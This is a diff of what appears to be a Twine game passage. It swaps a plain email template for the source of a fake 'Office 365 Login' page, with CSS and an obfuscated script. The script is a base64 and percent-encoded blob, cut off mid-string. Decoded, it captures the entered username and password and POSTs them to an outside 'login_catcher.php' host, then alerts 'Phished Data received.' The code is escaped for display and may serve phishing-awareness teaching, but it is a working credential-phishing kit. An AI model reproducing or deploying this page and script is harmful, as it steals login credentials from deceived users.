@@ -1,93 +1,149 @@
 :: SourceCode
-(set: $quelltextheader to 
-"&lt;html&gt;
-  &lt;head&gt;
-  &lt;/head&gt;
-  &lt;body&gt;
-    &lt;span class='preheader'&gt;This is preheader text. Some clients will show this text as a preview.&lt;/span&gt;
-    &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0' class='body'&gt;
-    &lt;span class='preheader'&gt;This is preheader text. Some clients will show this text as a preview.&lt;/span&gt;
-    &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0' class='body'&gt;
-      &lt;tr&gt;
-        &lt;td&gt;&nbsp;&lt;/td&gt;
-        &lt;td class='container'&gt;
-          &lt;div class='content'&gt;
-        &lt;td class='container'&gt;
-          &lt;div class='content'&gt;
-
-            &lt;!-- START CENTERED WHITE CONTAINER --&gt;
-            &lt;table role='presentation' class='main'&gt;
-            &lt;table role='presentation' class='main'&gt;
-
-              &lt;!-- START MAIN CONTENT AREA --&gt;
-              &lt;tr&gt;
-                &lt;td class='wrapper'&gt;
-                  &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0'&gt;
-                &lt;td class='wrapper'&gt;
-                  &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0'&gt;
-                    &lt;tr&gt;
-                      &lt;td&gt;
-                        &lt;p&gt;Hi there,&lt;/p&gt;
-                        &lt;p&gt;Sometimes you just want to send a simple HTML email with a simple design and clear call to action. This is it.&lt;/p&gt;
-                        &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0' class='btn btn-primary'&gt;
-                          &lt;tbody&gt;
-                            &lt;tr&gt;
-                              &lt;td align='left'&gt;
-                                &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0'&gt;
-                                  &lt;tbody&gt;
-                                    &lt;tr&gt;
-                                      &lt;td&gt; &lt;a href='http://htmlemail.io' target='_blank'&gt;Call To Action&lt;/a&gt; &lt;/td&gt;
-                                    &lt;/tr&gt;
-                                  &lt;/tbody&gt;
-                                &lt;/table&gt;
-                              &lt;/td&gt;
-                            &lt;/tr&gt;
-                          &lt;/tbody&gt;
-                        &lt;/table&gt;
-                        &lt;p&gt;This is a really simple email template. Its sole purpose is to get the recipient to click the button with no distractions.&lt;/p&gt;
-                        &lt;p&gt;Good luck! Hope it works.&lt;/p&gt;
-                      &lt;/td&gt;
-                      &lt;td&gt;')\
-                    (set: $quelltextfooter to 
-                      '&lt;/td&gt;
-                    &lt;/tr&gt;
-                  &lt;/table&gt;
-                &lt;/td&gt;
-            &lt;!-- END CENTERED WHITE CONTAINER --&gt;
-
-            &lt;!-- START FOOTER --&gt;
-            &lt;div class='footer'&gt;
-              &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0'&gt;
-            &lt;div class='footer'&gt;
-              &lt;table role='presentation' border='0' cellpadding='0' cellspacing='0'&gt;
-                &lt;tr&gt;
-                  &lt;td class='content-block'&gt;
-                    &lt;span class='apple-link'&gt;Company Inc, 3 Abbey Road, San Francisco CA 94102&lt;/span&gt;
-                    &lt;br&gt; Don't like these emails? &lt;a href='http://i.imgur.com/CScmqnj.gif'&gt;Unsubscribe&lt;/a&gt;.
-                  &lt;td class='content-block'&gt;
-                    &lt;span class='apple-link'&gt;Company Inc, 3 Abbey Road, San Francisco CA 94102&lt;/span&gt;
-                    &lt;br&gt; Don't like these emails? &lt;a href='http://i.imgur.com/CScmqnj.gif'&gt;Unsubscribe&lt;/a&gt;.
-                  &lt;/td&gt;
-                &lt;/tr&gt;
-                &lt;tr&gt;
-                  &lt;td class='content-block powered-by'&gt;
-                    Powered by &lt;a href='http://htmlemail.io'&gt;HTMLemail&lt;/a&gt;.
-                  &lt;td class='content-block powered-by'&gt;
-                    Powered by &lt;a href='http://htmlemail.io'&gt;HTMLemail&lt;/a&gt;.
-                  &lt;/td&gt;
-                &lt;/tr&gt;
-              &lt;/table&gt;
-      &lt;/tr&gt;
-    &lt;/table&gt;
-  &lt;/body&gt;
-&lt;/html&gt;
+{
+(set: $quelltext to "
+&lt;!DOCTYPE&emsp;html&gt;
+&lt;html&gt;
+&emsp;&emsp;&lt;head&gt;
+&emsp;&emsp;&emsp;&emsp;&lt;title&gt;Office&emsp;365&emsp;Login&lt;/title&gt;
+&emsp;&emsp;&lt;/head&gt;
+&emsp;&emsp;&lt;body&gt;
+&emsp;&emsp;&emsp;&emsp;&lt;h1&gt;Office&emsp;365&emsp;Login&lt;/h1&gt;
+&emsp;&emsp;&emsp;&emsp;&lt;form&emsp;action='/login'&emsp;method='post'&gt;
+&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;label&emsp;for='username'&gt;Username:&lt;/label&gt;&lt;br&gt;
+&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;input&emsp;type='text'&emsp;id='username'&emsp;name='username'&gt;&lt;br&gt;
+&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;label&emsp;for='password'&gt;Password:&lt;/label&gt;&lt;br&gt;
+&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;input&emsp;type='password'&emsp;id='password'&emsp;name='password'&gt;&lt;br&gt;&lt;br&gt;
+&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&lt;input&emsp;type='submit'&emsp;value='Submit'&gt;
+&emsp;&emsp;&emsp;&emsp;&lt;/form&gt;&emsp;
+&emsp;&emsp;&lt;/body&gt;
 &lt;/html&gt;")\
-(set: $script to "
-&lt;script&gt;
-document.write(unescape(atob(
-'JTY2JTc1JTZFJTYzJTc0JTY5JTZGJTZFJTIwJTczJTY1JTZFJTY0JTQ0JTYxJTc0JTYxJTI4JTY0JTYxJTc0JTYxJTI5JTIwJTdCJTBBJTIwJTIwJTYzJTZGJTZFJTczJTZGJTZDJTY1JTJFJTZDJTZGJTY3JTI4JTI3JTUzJTY1JTZFJTY0JTY5JTZFJTY3JTIwJTY0JTYxJTc0JTYxJTI3JTI5JTNCJTBBJTBBJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTU4JTQ4JTUyJTIwJTNEJTIwJTZFJTY1JTc3JTIwJTU4JTREJTRDJTQ4JTc0JTc0JTcwJTUyJTY1JTcxJTc1JTY1JTczJTc0JTI4JTI5JTNCJTBBJTBBJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTUwJTYxJTY5JTcyJTczJTIwJTNEJTIwJTVCJTVEJTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTU0JTc1JTcyJTZFJTIwJTc0JTY4JTY1JTIwJTY0JTYxJTc0JTYxJTIwJTZGJTYyJTZBJTY1JTYzJTc0JTIwJTY5JTZFJTc0JTZGJTIwJTYxJTZFJTIwJTYxJTcyJTcyJTYxJTc5JTIwJTZGJTY2JTIwJTU1JTUyJTRDJTJEJTY1JTZFJTYzJTZGJTY0JTY1JTY0JTIwJTZCJTY1JTc5JTJGJTc2JTYxJTZDJTc1JTY1JTIwJTcwJTYxJTY5JTcyJTczJTJFJTBBJTIwJTIwJTY2JTZGJTcyJTIwJTI4JTYzJTZGJTZFJTczJTc0JTIwJTVCJTZFJTYxJTZEJTY1JTJDJTIwJTcwJTYxJTczJTczJTc3JTZGJTcyJTY0JTVEJTIwJTZGJTY2JTIwJTRGJTYyJTZBJTY1JTYzJTc0JTJFJTY1JTZFJTc0JTcyJTY5JTY1JTczJTI4JTY0JTYxJTc0JTYxJTI5JTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTUwJTYxJTY5JTcyJTczJTJFJTcwJTc1JTczJTY4JTI4JTYwJTI0JTdCJTY1JTZFJTYzJTZGJTY0JTY1JTU1JTUyJTQ5JTQzJTZGJTZEJTcwJTZGJTZFJTY1JTZFJTc0JTI4JTZFJTYxJTZEJTY1JTI5JTdEJTNEJTI0JTdCJTY1JTZFJTYzJTZGJTY0JTY1JTU1JTUyJTQ5JTQzJTZGJTZEJTcwJTZGJTZFJTY1JTZFJTc0JTI4JTc2JTYxJTZDJTc1JTY1JTI5JTdEJTYwJTI5JTNCJTBBJTIwJTIwJTdEJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQzJTZGJTZEJTYyJTY5JTZFJTY1JTIwJTc0JTY4JTY1JTIwJTcwJTYxJTY5JTcyJTczJTIwJTY5JTZFJTc0JTZGJTIwJTYxJTIwJTczJTY5JTZFJTY3JTZDJTY1JTIwJTczJTc0JTcyJTY5JTZFJTY3JTIwJTYxJTZFJTY0JTIwJTcyJTY1JTcwJTZDJTYxJTYzJTY1JTIwJTYxJTZDJTZDJTIwJTI1JTJEJTY1JTZFJTYzJTZGJTY0JTY1JTY0JTIwJTczJTcwJTYxJTYzJTY1JTczJTIwJTc0JTZGJTBBJTIwJTIwJTJGJTJGJTIwJTc0JTY4JTY1JTIwJTI3JTJCJTI3JTIwJTYzJTY4JTYxJTcyJTYxJTYzJTc0JTY1JTcyJTNCJTIwJTZEJTYxJTc0JTYzJTY4JTY1JTczJTIwJTc0JTY4JTY1JTIwJTYyJTY1JTY4JTYxJTc2JTY5JTZGJTcyJTIwJTZGJTY2JTIwJTYyJTcyJTZGJTc3JTczJTY1JTcyJTIwJTY2JTZGJTcyJTZEJTIwJTczJTc1JTYyJTZEJTY5JTczJTczJTY5JTZGJTZFJTczJTJFJTBBJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTIwJTNEJTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTUwJTYxJTY5JTcyJTczJTJFJTZBJTZGJTY5JTZFJTI4JTI3JTI2JTI3JTI5JTJFJTcyJTY1JTcwJTZDJTYxJTYzJTY1JTI4JTJGJTI1JTMyJTMwJTJGJTY3JTJDJTIwJTI3JTJCJTI3JTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQ0JTY1JTY2JTY5JTZFJTY1JTIwJTc3JTY4JTYxJTc0JTIwJTY4JTYxJTcwJTcwJTY1JTZFJTczJTIwJTZGJTZFJTIwJTczJTc1JTYzJTYzJTY1JTczJTczJTY2JTc1JTZDJTIwJTY0JTYxJTc0JTYxJTIwJTczJTc1JTYyJTZEJTY5JTczJTczJTY5JTZGJTZFJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTYxJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTRDJTY5JTczJTc0JTY1JTZFJTY1JTcyJTI4JTI3JTZDJTZGJTYxJTY0JTI3JTJDJTIwJTI4JTY1JTc2JTY1JTZFJTc0JTI5JTIwJTNEJTNFJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTYxJTZDJTY1JTcyJTc0JTI4JTI3JTU5JTY1JTYxJTY4JTIxJTIwJTUwJTY4JTY5JTczJTY4JTY1JTY0JTIwJTQ0JTYxJTc0JTYxJTIwJTcyJTY1JTYzJTY1JTY5JTc2JTY1JTY0JTJFJTI3JTI5JTNCJTBBJTIwJTIwJTdEJTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQ0JTY1JTY2JTY5JTZFJTY1JTIwJTc3JTY4JTYxJTc0JTIwJTY4JTYxJTcwJTcwJTY1JTZFJTczJTIwJTY5JTZFJTIwJTYzJTYxJTczJTY1JTIwJTZGJTY2JTIwJTY1JTcyJTcyJTZGJTcyJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTYxJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTRDJTY5JTczJTc0JTY1JTZFJTY1JTcyJTI4JTI3JTY1JTcyJTcyJTZGJTcyJTI3JTJDJTIwJTI4JTY1JTc2JTY1JTZFJTc0JTI5JTIwJTNEJTNFJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTYxJTZDJTY1JTcyJTc0JTI4JTI3JTRGJTZGJTcwJTczJTIxJTIwJTUzJTZGJTZEJTY1JTc0JTY4JTY5JTZFJTY3JTIwJTc3JTY1JTZFJTc0JTIwJTc3JTcyJTZGJTZFJTY3JTJFJTI3JTI5JTNCJTBBJTIwJTIwJTdEJTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTUzJTY1JTc0JTIwJTc1JTcwJTIwJTZGJTc1JTcyJTIwJTcyJTY1JTcxJTc1JTY1JTczJTc0JTBBJTIwJTIwJTc2JTYxJTcyJTIwJTZDJTY5JTZFJTZCJTIwJTNEJTIwJTY0JTY1JTYzJTZGJTY0JTY1JTU1JTUyJTQ5JTQzJTZGJTZEJTcwJTZGJTZFJTY1JTZFJTc0JTI4JTI3JTY4JTc0JTc0JTcwJTczJTI1JTMzJTQxJTI1JTMyJTQ2JTI1JTMyJTQ2JTZEJTc5JTZDJTY5JTc0JTc0JTZDJTY1JTY2JTZDJTZGJTc3JTY1JTcyJTczJTY4JTZGJTcwJTJFJTYzJTZGJTZEJTI1JTMyJTQ2JTZFJTZGJTYxJTcyJTc0JTY5JTYzJTZDJTY1JTI1JTMyJTQ2JTZDJTZGJTY3JTY5JTZFJTVGJTYzJTYxJTc0JTYzJTY4JTY1JTcyJTJFJTcwJTY4JTcwJTI3JTI5JTNCJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTZGJTcwJTY1JTZFJTI4JTI3JTUwJTRGJTUzJTU0JTI3JTJDJTIwJTZDJTY5JTZFJTZCJTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQxJTY0JTY0JTIwJTc0JTY4JTY1JTIwJTcyJTY1JTcxJTc1JTY5JTcyJTY1JTY0JTIwJTQ4JTU0JTU0JTUwJTIwJTY4JTY1JTYxJTY0JTY1JTcyJTIwJTY2JTZGJTcyJTIwJTY2JTZGJTcyJTZEJTIwJTY0JTYxJTc0JTYxJTIwJTUwJTRGJTUzJTU0JTIwJTcyJTY1JTcxJTc1JTY1JTczJTc0JTczJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTczJTY1JTc0JTUyJTY1JTcxJTc1JTY1JTczJTc0JTQ4JTY1JTYxJTY0JTY1JTcyJTI4JTI3JTQzJTZGJTZFJTc0JTY1JTZFJTc0JTJEJTU0JTc5JTcwJTY1JTI3JTJDJTIwJTI3JTYxJTcwJTcwJTZDJTY5JTYzJTYxJTc0JTY5JTZGJTZFJTJGJTc4JTJEJTc3JTc3JTc3JTJEJTY2JTZGJTcyJTZEJTJEJTc1JTcyJTZDJTY1JTZFJTYzJTZGJTY0JTY1JTY0JTI3JTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQ2JTY5JTZFJTYxJTZDJTZDJTc5JTJDJTIwJTczJTY1JTZFJTY0JTIwJTZGJTc1JTcyJTIwJTY0JTYxJTc0JTYxJTJFJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTczJTY1JTZFJTY0JTI4JTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTI5JTNCJTBBJTdEJTBBJTBBJTYyJTc0JTZFJTJFJTYxJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTRDJTY5JTczJTc0JTY1JTZFJTY1JTcyJTI4JTI3JTYzJTZDJTY5JTYzJTZCJTI3JTJDJTIwJTI4JTI5JTIwJTNEJTNFJTIwJTdCJTBBJTIwJTIwJTczJTY1JTZFJTY0JTQ0JTYxJTc0JTYxJTI4JTdCJTIwJTVCJTc1JTczJTY1JTcyJTJDJTIwJTcwJTYxJTczJTczJTc3JTZGJTcyJTY0JTVEJTNBJTIwJTI3JTZGJTZCJTI3JTIwJTdEJTI5JTNCJTBBJTdEJTI5JTBB'))
-&lt;/script&gt;
+(set: $style to "
+	&lt;style&gt;
+&emsp;&emsp;body&emsp;{
+&emsp;&emsp;&emsp;&emsp;background-color:&emsp;#f0f0f0;
+&emsp;&emsp;&emsp;&emsp;font-family:&emsp;Arial,&emsp;sans-serif;
+&emsp;&emsp;&emsp;&emsp;margin:&emsp;0;
+&emsp;&emsp;&emsp;&emsp;padding:&emsp;0;
+&emsp;&emsp;}
+
+&emsp;&emsp;.container&emsp;{
+&emsp;&emsp;&emsp;&emsp;width:&emsp;400px;
+&emsp;&emsp;&emsp;&emsp;margin:&emsp;0&emsp;auto;
+&emsp;&emsp;&emsp;&emsp;text-align:&emsp;center;
+&emsp;&emsp;}
+
+&emsp;&emsp;h1&emsp;{
+&emsp;&emsp;&emsp;&emsp;color:&emsp;#0072c6;
+&emsp;&emsp;&emsp;&emsp;font-size:&emsp;26px;
+&emsp;&emsp;&emsp;&emsp;margin:&emsp;20px&emsp;0;
+&emsp;&emsp;}
+
+&emsp;&emsp;form&emsp;{
+&emsp;&emsp;&emsp;&emsp;background-color:&emsp;#ffffff;
+&emsp;&emsp;&emsp;&emsp;border:&emsp;1px&emsp;solid&emsp;#cccccc;
+&emsp;&emsp;&emsp;&emsp;border-radius:&emsp;5px;
+&emsp;&emsp;&emsp;&emsp;box-shadow:&emsp;0&emsp;2px&emsp;2px&emsp;rgba(0,&emsp;0,&emsp;0,&emsp;0.2);
+&emsp;&emsp;&emsp;&emsp;margin:&emsp;20px&emsp;0;
+&emsp;&emsp;&emsp;&emsp;padding:&emsp;20px;
+&emsp;&emsp;}
+
+&emsp;&emsp;label&emsp;{
+&emsp;&emsp;&emsp;&emsp;display:&emsp;block;
+&emsp;&emsp;&emsp;&emsp;font-size:&emsp;14px;
+&emsp;&emsp;&emsp;&emsp;margin-bottom:&emsp;10px;
+&emsp;&emsp;}
+
+&emsp;&emsp;input[type='text'],
+&emsp;&emsp;input[type='password']&emsp;{
+&emsp;&emsp;&emsp;&emsp;width:&emsp;100%;
+&emsp;&emsp;&emsp;&emsp;border:&emsp;1px&emsp;solid&emsp;#cccccc;
+&emsp;&emsp;&emsp;&emsp;border-radius:&emsp;3px;
+&emsp;&emsp;&emsp;&emsp;box-sizing:&emsp;border-box;
+&emsp;&emsp;&emsp;&emsp;font-size:&emsp;14px;
+&emsp;&emsp;&emsp;&emsp;padding:&emsp;8px;
+&emsp;&emsp;}
+
+&emsp;&emsp;input[type='submit']&emsp;{
+&emsp;&emsp;&emsp;&emsp;background-color:&emsp;#0072c6;
+&emsp;&emsp;&emsp;&emsp;border:&emsp;0;
+&emsp;&emsp;&emsp;&emsp;border-radius:&emsp;3px;
+&emsp;&emsp;&emsp;&emsp;color:&emsp;#ffffff;
+&emsp;&emsp;&emsp;&emsp;cursor:&emsp;pointer;
+&emsp;&emsp;&emsp;&emsp;font-size:&emsp;14px;
+&emsp;&emsp;&emsp;&emsp;font-weight:&emsp;bold;
+&emsp;&emsp;&emsp;&emsp;padding:&emsp;10px&emsp;20px;
+&emsp;&emsp;}
+
+&emsp;&emsp;input[type='submit']:hover&emsp;{
+&emsp;&emsp;&emsp;&emsp;background-color:&emsp;#0065b3;
+&emsp;&emsp;}
+&lt;/style&gt;
 ")\
-(text-size: 0.5) + (box: 'X', 80)[$quelltextheader
-$quelltextfooter
-$script]
+(set: $script to "&lt;script&gt;
+document.write(unescape(atob(
+'JTY2JTc1JTZFJTYzJTc0JTY5JTZGJTZFJTIwJTczJTY1JTZFJTY0JTQ0JTYxJTc0JTYxJTI4JTY0JTYxJTc0JTY
+xJTI5JTIwJTdCJTBBJTIwJTIwJTYzJTZGJTZFJTczJTZGJTZDJTY1JTJFJTZDJTZGJTY3JTI4JTI3JTUzJTY1JTZ
+FJTY0JTY5JTZFJTY3JTIwJTY0JTYxJTc0JTYxJTI3JTI5JTNCJTBBJTBBJTIwJTIwJTYzJTZGJTZFJTczJTc0JTI
+wJTU4JTQ4JTUyJTIwJTNEJTIwJTZFJTY1JTc3JTIwJTU4JTREJTRDJTQ4JTc0JTc0JTcwJTUyJTY1JTcxJTc1JTY
+1JTczJTc0JTI4JTI5JTNCJTBBJTBBJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZ
+GJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTUwJTYxJTY5JTcyJTczJTIwJTNEJTIwJTVCJTVEJTNCJTBBJTBBJTIwJTI
+wJTJGJTJGJTIwJTU0JTc1JTcyJTZFJTIwJTc0JTY4JTY1JTIwJTY0JTYxJTc0JTYxJTIwJTZGJTYyJTZBJTY1JTY
+zJTc0JTIwJTY5JTZFJTc0JTZGJTIwJTYxJTZFJTIwJTYxJTcyJTcyJTYxJTc5JTIwJTZGJTY2JTIwJTU1JTUyJTR
+DJTJEJTY1JTZFJTYzJTZGJTY0JTY1JTY0JTIwJTZCJTY1JTc5JTJGJTc2JTYxJTZDJTc1JTY1JTIwJTcwJTYxJTY
+5JTcyJTczJTJFJTBBJTIwJTIwJTY2JTZGJTcyJTIwJTI4JTYzJTZGJTZFJTczJTc0JTIwJTVCJTZFJTYxJTZEJTY
+1JTJDJTIwJTcwJTYxJTczJTczJTc3JTZGJTcyJTY0JTVEJTIwJTZGJTY2JTIwJTRGJTYyJTZBJTY1JTYzJTc0JTJ
+FJTY1JTZFJTc0JTcyJTY5JTY1JTczJTI4JTY0JTYxJTc0JTYxJTI5JTI5JTIwJTdCJTBBJTIwJTIwJTIwJTIwJTc
+1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTUwJTYxJTY5JTcyJTczJTJFJTcwJTc1JTc
+zJTY4JTI4JTYwJTI0JTdCJTY1JTZFJTYzJTZGJTY0JTY1JTU1JTUyJTQ5JTQzJTZGJTZEJTcwJTZGJTZFJTY1JTZ
+FJTc0JTI4JTZFJTYxJTZEJTY1JTI5JTdEJTNEJTI0JTdCJTY1JTZFJTYzJTZGJTY0JTY1JTU1JTUyJTQ5JTQzJTZ
+GJTZEJTcwJTZGJTZFJTY1JTZFJTc0JTI4JTc2JTYxJTZDJTc1JTY1JTI5JTdEJTYwJTI5JTNCJTBBJTIwJTIwJTd
+EJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQzJTZGJTZEJTYyJTY5JTZFJTY1JTIwJTc0JTY4JTY1JTIwJTcwJTYxJTY
+5JTcyJTczJTIwJTY5JTZFJTc0JTZGJTIwJTYxJTIwJTczJTY5JTZFJTY3JTZDJTY1JTIwJTczJTc0JTcyJTY5JTZ
+FJTY3JTIwJTYxJTZFJTY0JTIwJTcyJTY1JTcwJTZDJTYxJTYzJTY1JTIwJTYxJTZDJTZDJTIwJTI1JTJEJTY1JTZ
+FJTYzJTZGJTY0JTY1JTY0JTIwJTczJTcwJTYxJTYzJTY1JTczJTIwJTc0JTZGJTBBJTIwJTIwJTJGJTJGJTIwJTc
+0JTY4JTY1JTIwJTI3JTJCJTI3JTIwJTYzJTY4JTYxJTcyJTYxJTYzJTc0JTY1JTcyJTNCJTIwJTZEJTYxJTc0JTY
+zJTY4JTY1JTczJTIwJTc0JTY4JTY1JTIwJTYyJTY1JTY4JTYxJTc2JTY5JTZGJTcyJTIwJTZGJTY2JTIwJTYyJTc
+yJTZGJTc3JTczJTY1JTcyJTIwJTY2JTZGJTcyJTZEJTIwJTczJTc1JTYyJTZEJTY5JTczJTczJTY5JTZGJTZFJTc
+zJTJFJTBBJTIwJTIwJTYzJTZGJTZFJTczJTc0JTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTY
+xJTc0JTYxJTIwJTNEJTIwJTc1JTcyJTZDJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTUwJTYxJTY
+5JTcyJTczJTJFJTZBJTZGJTY5JTZFJTI4JTI3JTI2JTI3JTI5JTJFJTcyJTY1JTcwJTZDJTYxJTYzJTY1JTI4JTJ
+GJTI1JTMyJTMwJTJGJTY3JTJDJTIwJTI3JTJCJTI3JTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQ0JTY1JTY
+2JTY5JTZFJTY1JTIwJTc3JTY4JTYxJTc0JTIwJTY4JTYxJTcwJTcwJTY1JTZFJTczJTIwJTZGJTZFJTIwJTczJTc
+1JTYzJTYzJTY1JTczJTczJTY2JTc1JTZDJTIwJTY0JTYxJTc0JTYxJTIwJTczJTc1JTYyJTZEJTY5JTczJTczJTY
+5JTZGJTZFJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTYxJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTRDJTY5JTczJTc0JTY
+1JTZFJTY1JTcyJTI4JTI3JTZDJTZGJTYxJTY0JTI3JTJDJTIwJTI4JTY1JTc2JTY1JTZFJTc0JTI5JTIwJTNEJTN
+FJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTYxJTZDJTY1JTcyJTc0JTI4JTI3JTU5JTY1JTYxJTY4JTIxJTIwJTUwJTY
+4JTY5JTczJTY4JTY1JTY0JTIwJTQ0JTYxJTc0JTYxJTIwJTcyJTY1JTYzJTY1JTY5JTc2JTY1JTY0JTJFJTI3JTI
+5JTNCJTBBJTIwJTIwJTdEJTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQ0JTY1JTY2JTY5JTZFJTY1JTIwJTc
+3JTY4JTYxJTc0JTIwJTY4JTYxJTcwJTcwJTY1JTZFJTczJTIwJTY5JTZFJTIwJTYzJTYxJTczJTY1JTIwJTZGJTY
+2JTIwJTY1JTcyJTcyJTZGJTcyJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTYxJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTR
+DJTY5JTczJTc0JTY1JTZFJTY1JTcyJTI4JTI3JTY1JTcyJTcyJTZGJTcyJTI3JTJDJTIwJTI4JTY1JTc2JTY1JTZ
+FJTc0JTI5JTIwJTNEJTNFJTIwJTdCJTBBJTIwJTIwJTIwJTIwJTYxJTZDJTY1JTcyJTc0JTI4JTI3JTRGJTZGJTc
+wJTczJTIxJTIwJTUzJTZGJTZEJTY1JTc0JTY4JTY5JTZFJTY3JTIwJTc3JTY1JTZFJTc0JTIwJTc3JTcyJTZGJTZ
+FJTY3JTJFJTI3JTI5JTNCJTBBJTIwJTIwJTdEJTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTUzJTY1JTc0JTI
+wJTc1JTcwJTIwJTZGJTc1JTcyJTIwJTcyJTY1JTcxJTc1JTY1JTczJTc0JTBBJTIwJTIwJTc2JTYxJTcyJTIwJTZ
+DJTY5JTZFJTZCJTIwJTNEJTIwJTY0JTY1JTYzJTZGJTY0JTY1JTU1JTUyJTQ5JTQzJTZGJTZEJTcwJTZGJTZFJTY
+1JTZFJTc0JTI4JTI3JTY4JTc0JTc0JTcwJTczJTI1JTMzJTQxJTI1JTMyJTQ2JTI1JTMyJTQ2JTZEJTc5JTZDJTY
+5JTc0JTc0JTZDJTY1JTY2JTZDJTZGJTc3JTY1JTcyJTczJTY4JTZGJTcwJTJFJTYzJTZGJTZEJTI1JTMyJTQ2JTZ
+FJTZGJTYxJTcyJTc0JTY5JTYzJTZDJTY1JTI1JTMyJTQ2JTZDJTZGJTY3JTY5JTZFJTVGJTYzJTYxJTc0JTYzJTY
+4JTY1JTcyJTJFJTcwJTY4JTcwJTI3JTI5JTNCJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTZGJTcwJTY1JTZFJTI4JTI
+3JTUwJTRGJTUzJTU0JTI3JTJDJTIwJTZDJTY5JTZFJTZCJTI5JTNCJTBBJTBBJTIwJTIwJTJGJTJGJTIwJTQxJTY
+0JTY0JTIwJTc0JTY4JTY1JTIwJTcyJTY1JTcxJTc1JTY5JTcyJTY1JTY0JTIwJTQ4JTU0JTU0JTUwJTIwJTY4JTY
+1JTYxJTY0JTY1JTcyJTIwJTY2JTZGJTcyJTIwJTY2JTZGJTcyJTZEJTIwJTY0JTYxJTc0JTYxJTIwJTUwJTRGJTU
+zJTU0JTIwJTcyJTY1JTcxJTc1JTY1JTczJTc0JTczJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTczJTY1JTc0JTUyJTY
+1JTcxJTc1JTY1JTczJTc0JTQ4JTY1JTYxJTY0JTY1JTcyJTI4JTI3JTQzJTZGJTZFJTc0JTY1JTZFJTc0JTJEJTU
+0JTc5JTcwJTY1JTI3JTJDJTIwJTI3JTYxJTcwJTcwJTZDJTY5JTYzJTYxJTc0JTY5JTZGJTZFJTJGJTc4JTJEJTc
+3JTc3JTc3JTJEJTY2JTZGJTcyJTZEJTJEJTc1JTcyJTZDJTY1JTZFJTYzJTZGJTY0JTY1JTY0JTI3JTI5JTNCJTB
+BJTBBJTIwJTIwJTJGJTJGJTIwJTQ2JTY5JTZFJTYxJTZDJTZDJTc5JTJDJTIwJTczJTY1JTZFJTY0JTIwJTZGJTc
+1JTcyJTIwJTY0JTYxJTc0JTYxJTJFJTBBJTIwJTIwJTU4JTQ4JTUyJTJFJTczJTY1JTZFJTY0JTI4JTc1JTcyJTZ
+DJTQ1JTZFJTYzJTZGJTY0JTY1JTY0JTQ0JTYxJTc0JTYxJTI5JTNCJTBBJTdEJTBBJTBBJTYyJTc0JTZFJTJFJTY
+xJTY0JTY0JTQ1JTc2JTY1JTZFJTc0JTRDJTY5JTczJTc0JTY1JTZFJTY1JTcyJTI4JTI3JTYzJTZDJTY5JTYzJTZ
+CJTI3JTJDJTIwJTI4JTI5JTIwJTNEJTNFJTIwJTdCJTBBJTIwJTIwJTczJTY1JTZFJTY0JTQ0JTYxJTc0JTYxJTI
+4JTdCJTIwJTVCJTc1JTczJTY1JTcyJTJDJTIwJTcwJTYxJTczJTczJTc3JTZGJTcyJTY0JTVEJTNBJTIwJTI3JTZ
